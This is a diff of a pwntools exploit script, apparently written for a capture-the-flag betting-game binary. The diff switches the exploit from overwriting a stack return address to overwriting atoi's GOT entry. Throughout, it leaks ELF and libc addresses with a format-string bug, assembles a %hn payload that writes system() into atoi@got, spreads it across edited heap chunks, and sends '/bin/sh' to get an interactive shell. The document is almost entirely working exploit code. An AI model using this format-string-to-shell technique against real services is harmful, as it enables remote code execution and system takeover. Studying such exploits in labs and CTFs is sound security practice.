@@ -20,84 +20,80 @@ def main():
     r = conn()
 
     PLAY = "1"
+    VIEW = "2"
     ADD = "3"
+    EDIT = "4"
     QUIT = "5"
 
-    # leak elf, stack, libc addresses
+    # leak elf, libc addresses
 
     r.sendline("1")
-    r.sendline("%x%x%38$x")
-    gdb.attach(r)  # to see ret in main
+    r.sendline("%x%x")
 
     r.sendline(PLAY)
     r.sendline("1") # nr of players
     r.sendline("1") # bet
     
     r.recvuntil("winner is *drumroll*: ")
-    leak = r.recvn(24)
+    leak = r.recvn(16)
     elf_leak = int(leak[:8], 16)
-    libc_leak = int(leak[8:16], 16)
-    stack_leak = int(leak[-8:], 16)
+    libc_leak = int(leak[-8:], 16)
 
     log.info("elf address leak: {}".format(hex(elf_leak)))
     log.info("libc address leak: {}".format(hex(libc_leak)))
-    log.info("stack address leak: {}".format(hex(stack_leak)))
     libc.address = libc_leak - libc.symbols['_IO_2_1_stdin_']
     exe.address = elf_leak - 4188
-    ret = stack_leak + 4
-    arg = stack_leak + 8
 
     system = libc.symbols['system']
-    binsh = next(libc.search('/bin/sh\x00'))
+    atoi_got = exe.got['atoi']
     log.info("system address: {}".format(hex(system)))
-    log.info("string address: {}".format(hex(binsh)))
-
-    # overwrite ret with system
-
-    r.sendline(ADD)
-    r.sendline(p32(ret) + "%{}x".format((system & 0x0000ffff) - 4) + "%19$hn")
-    r.sendline(PLAY)
-    r.sendline("2") # nr of players
-    r.sendline("999") # bet
-    r.sendline("1") # bet which triggers FSB
+    log.info("atoi@got address: {}".format(hex(atoi_got)))
+    
+    # dummy chunks
 
     r.sendline(ADD)
-    r.sendline(p32(ret+2) + "%{}x".format(int(hex(system & 0xffff0000)[2:6], 16) - 4) + "%19$hn")
-    r.sendline(PLAY)
-    r.sendline("3") # nr of players
-    [r.sendline("999") for i in range(2)]
-    r.sendline("1") # bet which triggers FSB
+    r.sendline("A" * 19)
+    r.sendline(ADD)
+    r.sendline("B" * 19)
+    r.sendline(ADD)
+    r.sendline("C" * 19)
 
-    # overwriting argument with "/bin/sh" string
+    # payload string
+
+    payload = ""
+    payload += p32(atoi_got) + p32(atoi_got+2) 
+    payload += "%{}x".format((system & 0x0000ffff) - 8) + "%19$hn" 
+    payload += "%{}x".format(((system & 0xffff0000) >> 16) - (system & 0x0000ffff)) + "%20$hn"
+    log.info("length of payload string: {}".format(len(payload)))
+
+    # edit the dummy chunks to create on big string
+
+    r.sendline(EDIT)
+    r.sendline("1")
+    r.sendline(payload[:16])
+
+    r.sendline(EDIT)
+    r.sendline("2")
+    r.sendline(payload[16:32])
+
+    r.sendline(EDIT)
+    r.sendline("3")
+    r.sendline(payload[32:])
+
+    # overwrite atoi@got with system
+
+    r.sendline(PLAY)
+    r.sendline("2")
+    r.sendline("999")
+    r.sendline("1")
+
+    # trigger format string bug
 
     r.sendline(ADD)
-    r.sendline(p32(arg) + "%{}x".format((binsh & 0x0000ffff) - 4) + "%19$hn")
-    r.sendline(PLAY)
-    r.sendline("4") # nr of players
-    [r.sendline("999") for i in range(3)]
-    r.sendline("1") # bet which triggers FSB
-
-    r.sendline(ADD)
-    r.sendline(p32(arg+2) + "%{}x".format(int(hex(binsh & 0xffff0000)[2:6], 16) - 4) + "%19$hn")
-    r.sendline(PLAY)
-    r.sendline("5") # nr of players
-    [r.sendline("999") for i in range(4)]
-    r.sendline("1") # bet which triggers FSB
-
-    # exiting main and performing the ret2libc
-
-    r.sendline(QUIT)
-    r.sendline("y")
+    r.sendline("/bin/sh")
 
     r.interactive()
 
 
 if __name__ == "__main__":
     main()
-
-'''
-FBS vuln in choice_1
-late comer has longer name - 19
-need to find out how to win round
-"%{}x".format((system & 0x0000ffff) - 8)
-'''
